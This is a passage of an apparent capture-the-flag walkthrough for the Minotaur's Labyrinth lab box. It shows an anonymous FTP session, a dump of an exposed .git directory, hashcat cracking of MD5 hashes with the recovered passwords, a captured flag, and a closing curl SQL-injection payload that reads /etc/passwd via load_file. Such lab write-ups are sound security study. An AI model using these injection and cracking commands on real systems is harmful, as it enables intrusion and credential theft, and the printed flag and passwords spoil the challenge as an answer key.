        b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
        c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]

        print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])

pwdgen()
```

<img width="1124" height="572" alt="image" src="https://github.com/user-attachments/assets/e6261fa6-29b5-4d5a-99dd-75260ff5ed92" />



<img width="860" height="104" alt="image" src="https://github.com/user-attachments/assets/7c42f4ba-5bf1-42a1-b564-38357fb9fb83" />


<br>

<img width="1226" height="524" alt="image" src="https://github.com/user-attachments/assets/f7818a39-ee6a-400e-9692-d55ced22adf1" />


<h3>/js/userlvl.js</h3>

<img width="1203" height="712" alt="image" src="https://github.com/user-attachments/assets/8ad68997-59c3-42fa-a67c-668199620778" />


<h3>/api/people</h3>

<img width="1185" height="256" alt="image" src="https://github.com/user-attachments/assets/573986d1-ffcf-48bf-b53c-df6bc3baafca" />


<br>

<h3>/jebaith.html</h3>

<p>

- spayc
- xenox
</p>

<img width="1291" height="247" alt="image" src="https://github.com/user-attachments/assets/6f2d08a0-1274-47a9-b734-4ba146c4fdda" />

<h3>/x.com/JeagerXenox</h3>

<img width="1296" height="582" alt="image" src="https://github.com/user-attachments/assets/638f9a6d-ca23-48eb-8a73-eab8d8d07792" />

<br>

<h3>//app.intigriti.com/profile/xenoxjeager</h3>

<img width="1282" height="598" alt="image" src="https://github.com/user-attachments/assets/4f22f0dc-8842-425c-8827-34d382f1e733" />

<br>

<h3>/x.com/spayc4</h3>

<img width="1156" height="472" alt="image" src="https://github.com/user-attachments/assets/807df239-92b0-4660-ac6b-889dd719dfe0" />


<h3>gobuster</h3>

```bash

```

<h3>FTP</h3>

```bash
:~/Minotaur´sLabyrinth# ftp TargetIP
...
Name (TargetIP:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15  2021 .
drwxr-xr-x   3 root     root         4.0k Jun 15  2021 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021 .
drwxr-xr-x   3 root     root         4.0k Jun 15  2021 ..
drwxr-xr-x   2 root     root         4.0k Jun 15  2021 .secret
-rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (2.8014 MB/s)
ftp> cd .secret
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4.0k Jun 15  2021 .
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021 ..
-rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
-rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful
150 Opening BINARY mode data connection for flag.txt (30 bytes)
226 Transfer complete
30 bytes received in 0.00 secs (81.6069 kB/s)
ftp> get keep_in_mind.txt
local: keep_in_mind.txt remote: keep_in_mind.txt
200 PORT command successful
150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
226 Transfer complete
114 bytes received in 0.00 secs (275.5647 kB/s)
ftp> exit
221 Goodbye.
```

```bash
:~/Minotaur´sLabyrinth# ls
flag.txt  keep_in_mind.txt  message.txt
```

```bash
:~/Minotaur´sLabyrinth# cat flag.txt
fl4g{tHa75_TH3_$7Ar7_ftPFLA9}
```

<p>

- Dedalus
- Minotaur  
</p>

```bash
:~/Minotaur´sLabyrinth# cat message.txt
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

<p>

- timer  
</p>

```bash
:~/Minotaur´sLabyrinth# cat keep_in_mind.txt
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

<br>

<br>
<br>
<br>
<br>


```bash
:# wget -r -np http://minotaur.thm/.git/

```


:~/minotaur.thm/.git# ls -lah
total 88K
drwxr-xr-x 8 root root 4.0K Jan  8 01:36  .
drwxr-xr-x 3 root root 4.0K Jan  8 01:36  ..
drwxr-xr-x 2 root root 4.0K Jan  8 01:36  branches
-rw-r--r-- 1 root root  258 Jun 15  2021  config
-rw-r--r-- 1 root root   73 Jun 15  2021  description
-rw-r--r-- 1 root root   21 Jun 15  2021  HEAD
drwxr-xr-x 2 root root 4.0K Jan  8 01:36  hooks
-rw-r--r-- 1 root root 2.8K Jun 15  2021  index
-rw-r--r-- 1 root root 2.9K Jan  8 01:36  index.html
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=D;O=A'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=D;O=D'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=M;O=A'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=M;O=D'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=N;O=A'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=N;O=D'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=S;O=A'
-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=S;O=D'
drwxr-xr-x 2 root root 4.0K Jan  8 01:36  info
drwxr-xr-x 3 root root 4.0K Jan  8 01:36  logs
drwxr-xr-x 4 root root 4.0K Jan  8 01:36  objects
-rw-r--r-- 1 root root  418 Jun 15  2021  packed-refs
drwxr-xr-x 5 root root 4.0K Jan  8 01:36  refs





:~/minotaur.thm/.git/logs# ls -lah
total 52K
drwxr-xr-x 3 root root 4.0K Jan  8 01:36  .
drwxr-xr-x 8 root root 4.0K Jan  8 01:36  ..
-rw-r--r-- 1 root root  178 Jun 15  2021  HEAD
-rw-r--r-- 1 root root 1.2K Jan  8 01:36  index.html
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=D;O=A'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=D;O=D'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=M;O=A'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=M;O=D'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=N;O=A'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=N;O=D'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=S;O=A'
-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=S;O=D'
drwxr-xr-x 4 root root 4.0K Jan  8 01:36  refs




:~# git clone https://github.com/spayc/minotaur-box
Cloning into 'minotaur-box'...
remote: Enumerating objects: 587, done.
remote: Total 587 (delta 0), reused 0 (delta 0), pack-reused 587 (from 1)
Receiving objects: 100% (587/587), 1.75 MiB | 21.63 MiB/s, done.
Resolving deltas: 100% (260/260), done.



:~/minotaur-box# ls
api  dbConnect.php  echo.php     imgs       jebait.html  License.txt  login.php   Minotaur-Box_Writeup.md  session.php
css  dbCreate.sql   favicon.png  index.php  js           login.html   logout.php  README.md



hashcat -m0 -a0 people /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt


Eurycliedes
Menekrates
Philostratos
Daedulus
M!n0taur

hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt


42354020b68c7ed28dcdeabd5a2baf8e
0b3bebe266a81fbfaa79db1604c4e67f
b83f966a6f5a9cff9c6e1c52b0aa635b
b8e4c23686a3a12476d7779e35fa5eb6
1765db9457f496a39859209ee81fbda4



hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

3898e56bf6fa6ddfc3c0977c514a65a8
5d20441c392b68c61592b2159990abfe
f847149233ae29ec0e1fcf052930c044
ea5540126c33fe653bf56e7a686b1770

curl -X POST http://minotaur.thm/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,load_file('/etc/passwd')-- -"
		

